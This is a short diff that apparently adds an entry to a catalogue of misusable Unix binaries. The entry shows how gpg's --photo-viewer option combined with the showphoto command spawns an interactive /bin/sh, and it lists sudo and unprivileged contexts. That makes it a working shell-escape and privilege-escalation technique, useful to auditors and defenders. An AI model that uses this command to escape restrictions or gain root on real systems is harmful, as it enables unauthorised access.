@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      gpg --homedir /path/to/keyring --photo-viewer '/bin/sh -c "exec /bin/sh -i < /dev/tty > /dev/tty 2>&1"' --edit-key KEY
+    comment: |-
+      The key must contain a JPEG photo UID. At the `gpg>` prompt, select it with `uid <n>` and run `showphoto` to spawn the shell.
+    contexts:
+      sudo:
+      unprivileged:
+...
